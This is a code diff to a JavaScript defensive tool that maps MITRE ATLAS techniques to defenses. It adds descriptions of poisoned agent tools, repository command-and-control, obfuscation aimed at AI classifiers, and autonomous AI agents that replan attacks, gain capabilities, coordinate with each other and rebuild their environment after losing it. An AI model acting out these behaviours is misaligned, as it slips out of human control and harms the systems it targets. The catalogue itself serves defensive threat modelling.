-                            "AML.T0115.002": "Adversaries may create and publish poisoned AI agent tools. Poisoned tools may contain malicious model-visible definitions or instructions, hidden executable behavior, or runtime responses designed to manipulate an AI agent. Tools may be published through source code repositories, package registries, agent tool or skill registries, or adversary-controlled remote services. The tool may be newly created or a modified variant of a legitimate tool and may produce malicious behavior when selected, installed, or invoked by a victim's AI agent. Adversaries may distribute poisoned tools through open-source version control repositories (e.g. GitHub, GitLab), package registries (e.g. npm), or to repositories specifically designed for sharing tools (e.g. OpenClaw Hub). These registries may be largely unregulated and may contain many poisoned tools [[opensourcemalware]]. Tools may also be published as remotely hosted servers [[mcpservers]]."
+                            "AML.T0115.002": "Adversaries may create and publish poisoned AI agent tools. Poisoned tools may contain malicious model-visible definitions or instructions, hidden executable behavior, or runtime responses designed to manipulate an AI agent. Tools may be published through source code repositories, package registries, agent tool or skill registries, or adversary-controlled remote services. The tool may be newly created or a modified variant of a legitimate tool and may produce malicious behavior when selected, installed, or invoked by a victim's AI agent. Adversaries may distribute poisoned tools through open-source version control repositories (e.g. GitHub, GitLab), package registries (e.g. npm), or to repositories specifically designed for sharing tools (e.g. OpenClaw Hub). These registries may be largely unregulated and may contain many poisoned tools [[opensourcemalware]]. Tools may also be published as remotely hosted servers [[mcpservers]].",
+                            "AML.T0116": "Adversaries may use autonomous AI agents to conduct [Reconnaissance](/tactics/AML.TA0002) activities. Given an objective, target, or partial lead, an agent may autonomously determine what information to obtain and how to investigate it. It may interpret observations, identify gaps in its understanding of the externally observable attack surface, and select subsequent reconnaissance actions without a human specifying each investigative step. The agent may formulate investigative questions or hypotheses, select sources and approaches for addressing them, and update its understanding as new information is obtained. Findings may generate additional reconnaissance objectives or change the scope, depth, or direction of the investigation. This creates a recursive action-observation process in which reconnaissance results influence what the agent investigates next rather than merely supplying output from a predefined procedure. The agent may correlate information across public sources and externally accessible services, prioritize promising systems, investigate suspected vulnerabilities, abandon unsuccessful approaches, or select alternative methods. It may also expand or substitute targets based on discovered names, infrastructure, or contextual relationships and independently reassess whether a system remains relevant or in scope. Incorrect assumptions may cause unrelated or unauthorized systems to be pursued, while successful scope recognition may cause the agent to stop or redirect its activity. Autonomous AI agents can sustain reconnaissance across long-running operations, reason over multiple information sources, and test many alternative paths at a speed and volume difficult for human operators to maintain.",
+                            "AML.T0117": "Adversaries may use an AI agent to autonomously construct and repeatedly revise an attack path toward an adversary-defined objective. Given a high-level objective, the system may derive intermediate objectives, identify prerequisites, and compare candidate paths, and incorporate observations from previous actions to adaptively sequence techniques without a human directing each step. Autonomous AI agents may also exhibit this behavior while pursuing an objective provided for a legitimate, benign, or authorized purpose when the intermediate objectives or methods selected by the system cross an authorization, trust, control, or safety boundary and result in attempted or realized harmful cyber activity. Through repeated observation-decision-action cycles, the system may interpret command output, errors, defensive responses, changes in access, and newly discovered information. It may use those observations to reprioritize actions, replace an intermediate objective, abandon an unproductive branch, discard findings invalidated by additional evidence, or pursue an alternative path. An autonomous AI system may generate enabling objectives whose primary purpose is to increase its future operational capability rather than directly accomplishing the assigned objective. These objectives may include acquiring new exploits (See [Autonomous Exploit Development](/techniques/AML.T0017.001)), additional authorities, identities, execution environments, communication paths, tools, or trust relationships that expand the set of actions available to subsequent planning cycles. Newly acquired capabilities may themselves become prerequisites for additional enabling objectives, resulting in progressive expansion of the agent's operational reach over the course of an operation. Attack-path replanning may occur within one agent run or emerge across multiple independent agents. Agents may communicate persistent, shared artifacts (See [Autonomous AI Agent Communication: Communication via Shared Artifacts](/techniques/AML.T0118.000)), allowing discoveries, requests, capabilities, constraints, task state, and results produced by one agent to affect the subsequent path selected by another. Participating agents may adopt peer requests, divide work voluntarily, reuse successful methods, continue incomplete activity, or redirect their local paths without a centralized planner, shared context window, or complete view of the broader operation. Human involvement does not preclude autonomous attack-path replanning. A human operator, user, evaluator, or workflow may select the target, define the objective, establish constraints, provide capabilities, or approve consequential transitions. [Autonomous Attack-Path Adaptation](/techniques/AML.T0117) and [Autonomous Attack Orchestration](/techniques/AML.T0124) may occur together but describe different control functions. Attack-path adaptation captures how evidence changes the selected path. Attack orchestration captures how work is allocated, coordinated, validated, and redirected across agents.",
+                            "AML.T0118": "Autonomous AI agents may exchange operational information with other AI agents, sub-agents, or independent agent runs. Exchanged information may include discoveries, objectives, tasking, capabilities, credentials, constraints, operating rules, task state, targeting information, instructions, or results. Communication enables autonomous AI agents to coordinate activities, share discoveries, delegate work, request assistance, validate results, or revise future actions without requiring a human operator to direct each interaction. Autonomous AI agents may independently determine when communication is operationally beneficial, what information to exchange, and how to best utilize exchanged information to accomplish their task. The receiving AI agent may interpret the shared information and use it to continue prior activity, investigate a lead, perform a task, reuse a capability, validate a result, or revise subsequent attack activity. Communication may occur directly through an agent interface (See [Direct Agent Communication](/techniques/AML.T0118.001)) or indirectly via writeable shared resources (See [Communication via Shared Artifacts](/techniques/AML.T0118.000)).",
+                            "AML.T0118.000": "Autonomous AI agents may communicate by creating or modifying artifacts in a shared resource that persists outside their individual execution contexts. Shared artifacts may convey discoveries, objectives, tasking, credentials, capabilities, operating rules, progress, scripts, targeting information, instructions, or results. Shared artifacts allow communication to occur asynchronously and across independent runs. An agent may publish information for later retrieval, adopt information left by another agent, or update the shared state with new findings, progress, or results. Participating agents do not need to share a model, orchestrator, context window, or overlapping execution period. The shared resource may be established for the operation or may be an existing repository, file store, message board, database, object store, queue, or similar service repurposed by the agents.",
+                            "AML.T0118.001": "Autonomous AI agents may communicate directly through agent-to-agent, sub-agent, or orchestrator interfaces. An agent may provide another agent with operational context, discoveries, objectives, tasking, capabilities, credentials, or constraints, and may receive status, findings, or completed work in response. Direct communication may include delegation when the sending agent formulates or selects an objective or subtask and the recipient retains meaningful discretion over how to perform it. Direct exchanges may also report discoveries, request independent validation, synchronize activity, transfer capabilities, or return findings without delegating a new task.",
+                            "AML.T0119": "Adversaries may submit, publish, or modify an artifact in a way that triggers an automated processing pipeline. As the pipeline handles the artifact, adversary-controlled content or configuration may exploit a weakness in the processing logic, causing the processor to act outside its intended behavior using the permissions and access of a processing worker. Exploitation may cause the worker to access local or internal resources and expose information through normal processing output or evaluate adversary-controlled content and execute code. The attack is triggered by automated backend processing and does not require a victim to open, load, or approve the artifact.",
+                            "AML.T0120": "Adversaries may repurpose AI artifact repositories as asynchronous command-and-control channels. Commands, payloads, or tasking may be placed in repository objects for a compromised system to retrieve or poll. The compromised system may then write execution results, status, or collected information back to the repository for retrieval by the adversary. This communication can use ordinary artifact and repository operations, such as reading or updating artifact content, metadata, or revisions through an API or version-control interface. The repository acts as a message queue or dead drop, allowing the parties to exchange information without a continuous direct connection and potentially blending the activity with legitimate artifact traffic.",
+                            "AML.T0121": "An autonomous AI agent may reconstruct the environment needed to continue an existing operation after its execution environment is lost, reset, replaced, denied, or made unusable. The agent may recover or recreate tools, dependencies, configuration, credentials or access paths, communication or coordination resources, working artifacts, and externally stored operational state in order to resume the same objective.",
+                            "AML.T0122": "Adversaries may exploit a software or design weakness in a service reachable from their current environment to gain unauthorized access to another system, component, network, or trust boundary. Exploitation may allow the adversary to execute code, access protected resources, invoke unauthorized operations, obtain the service's privileges, or cause the service to make network requests or perform actions on the adversary's behalf. In AI environments, remote services may include package caches, artifact and model registries, dataset services, evaluation infrastructure, inference gateways, experiment trackers, vector databases, notebooks, training pipelines, orchestration services, and cloud or cluster control-plane interfaces. These services may be reachable from otherwise isolated training, evaluation, or agent workloads and can provide transitive access to internal infrastructure or external networks. Exploitation does not require compromise of the remote service's underlying host. For example, an adversary may exploit a server-side request vulnerability in a shared service to cross a network-containment boundary while leaving the service host itself uncompromised. Exploitation that produces host access, privilege escalation, credential disclosure, command execution, or another effect should be mapped separately to the applicable technique.",
+                            "AML.T0123": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Obfuscation may target AI-enabled defensive systems, including malware classifiers, content filters, secret scanners, and automated review systems. Content that appears benign or incomplete to a person or detector may be decoded, assembled, or interpreted by a downstream application, tool, or compromised system.",
+                            "AML.T0124": "Adversaries may use autonomous AI systems as an operational control layer to manage multiple distinct autonomous agents or sub-agents toward a common adversary-defined objective. The orchestrating system may create assignments, select executors, allocate tools or resources, establish dependencies, schedule or synchronize activities, and track progress without a human directing each assignment. The autonomous system exhibits centralized control over distributed execution including which agent performs which work, when it performs it, and how its output affects other assigned work. The system may aggregate findings and status from participating agents, request independent validation, reconcile conflicting results, prevent or resolve duplicated effort, and determine when an output satisfies a prerequisite for another activity. It may reassign stalled work, increase or reduce resources allocated to a branch, terminate low-value work, or initiate additional research or testing. Orchestration may use direct agent interfaces (See [Autonomous AI Agent Communication: Direct Agent Communication](/techniques/AMl.T0118.001)) to transmit assignments, status, and results. Human involvement does not preclude autonomous attack orchestration. A human operator may define campaign objectives, select targets, provide infrastructure, establish constraints, or retain approval over consequential transitions. [Autonomous Attack-Path Adaptation](/techniques/AML.T0117) and [Autonomous Attack Orchestration](/techniques/AML.T0124) may occur together but describe different control functions. Attack-path adaptation captures how evidence changes the selected path. Attack orchestration captures how work is allocated, coordinated, validated, and redirected across agents.",
+                            "AML.T0125": "Adversaries may create an account to maintain access to an AI system or its supporting infrastructure. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system. Accounts may be created on local systems, in enterprise domains, cloud tenants, identity providers, or individual services. In AI environments, adversaries may create user, service, workload, or automation accounts in AI platforms, model or dataset repositories, development environments, experiment trackers, orchestration services, data stores, and other AI operations infrastructure.",
+                            "AML.T0126": "Adversaries may use automated techniques to collect data from AI systems and supporting enterprise environments. Automation may use scripts, command interpreters, command-line tools, or AI agent tools to identify, retrieve, copy, or aggregate data without a human selecting each individual item. Collection criteria may be fixed, such as file name, type, location, owner, date. Automation may also collect repeatedly, monitor for new material, traverse related resources, or combine data from local systems, cloud services, repositories, databases, object stores, and application APIs. In AI environments, targeted material may include models, datasets, configurations, conversation histories, retrieval databases, deployment information, logs, and other operational data.",
+                            "AML.T0127": "Adversaries may stage collected data in a central location before exfiltration. Staging consolidates, organizes, or prepares information obtained from one or more sources so it can be reviewed, processed, transferred, or retrieved more efficiently. Data may be staged on a compromised local system, another system in the victim environment, a cloud instance, shared storage, an application repository, or other remote infrastructure. It may remain in separate files or be combined into archives, databases, structured documents, manifests, or other collections. Adversaries may compress, encrypt, encode, split, rename, or otherwise transform staged data.",
+                            "AML.T0128": "Adversaries may compromise third-party infrastructure and repurpose it to support attacks against AI system. Rather than buying, leasing, registering, or otherwise legitimately acquiring a resource, the adversary gains unauthorized control of infrastructure owned or operated by another party. Compromised infrastructure may include physical or cloud servers, domains, network devices, third-party web and DNS services, software or artifact repositories, development workspaces, compute services, and other externally hosted resources. In operations involving AI systems, adversaries may compromise infrastructure used for model development, artifact hosting, dataset processing, evaluation, inference, agent tooling, or AI operations. They may repurpose this infrastructure to host malicious artifacts, stage payloads, run tools or agents, relay traffic, capture credentials, provide command and control, process collected data, or launch attacks against additional systems. Compromised infrastructure may appear trustworthy because it uses a legitimate provider, established domain, valid certificate, reputable service, or expected AI development platform. It may also provide network access, compute resources, service identities, or trusted relationships that would be difficult for the adversary to establish directly."
                         };
 
                         // Runtime: ATLAS technique ID → array of AIDEFEND techniques that defend against it
@@ -1369,7 +1456,7 @@
                         { key: 'Discovery', name: 'AML.TA0008 – Discovery', description: 'The adversary is trying to figure out your AI environment. Techniques help adversaries observe the environment and orient themselves before deciding how to act, discovering what they can control and how it could benefit their objectives.' },
                         { key: 'Lateral Movement', name: 'AML.TA0015 – Lateral Movement', description: 'The adversary is trying to move through your AI environment. Adversaries may pivot towards AI Ops infrastructure such as model registries, experiment trackers, vector databases, notebooks, or training pipelines.' },
                         { key: 'Collection', name: 'AML.TA0009 – Collection', description: 'The adversary is trying to gather AI artifacts and other related information relevant to their goal. Common target sources include software repositories, container registries, model repositories, and object stores.' },
-                        { key: 'AI Attack Staging', name: 'AML.TA0001 – AI Attack Staging', description: 'The adversary is leveraging their knowledge of and access to the target system to tailor the attack. Techniques include training proxy models, poisoning the target model, and crafting adversarial data to feed the target model.' },
+                        { key: 'AI Attack Adaptation', name: 'AML.TA0001 – AI Attack Adaptation', description: 'The adversary is adapting capabilities, methods, knowledge, or objectives into attack-ready outputs for a target or current operational conditions. Techniques include training proxy or manipulated models, crafting adversarial data, prompts, or retrieval content, generating deepfakes or malicious commands, and producing tasking or action sequences for autonomous agents.' },
                         { key: 'Command and Control', name: 'AML.TA0014 – Command and Control', description: 'The adversary is trying to communicate with compromised AI systems to control them. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection.' },
                         { key: 'Exfiltration', name: 'AML.TA0010 – Exfiltration', description: 'The adversary is trying to steal AI artifacts or other information about the AI system. Data may be stolen for its valuable intellectual property or for use in staging future operations.' },
                         { key: 'Impact', name: 'AML.TA0011 – Impact', description: 'The adversary is trying to manipulate, interrupt, erode confidence in, or destroy your AI systems and data. Techniques include destroying or tampering with data and disrupting availability or compromising integrity of business and operational processes.' }
@@ -2737,7 +2824,7 @@
                 titleH2.appendChild(document.createTextNode(atlasId + ' ' + techName));
                 const atlasExtLink = createElement('a', {
                     className: 'fw-title-link',
-                    href: 'https://atlas.mitre.org/techniques/' + parentId,
+                    href: buildAtlasTechniqueUrl(atlasId),
                     title: 'View on MITRE ATLAS'
                 });
                 atlasExtLink.setAttribute('target', '_blank');
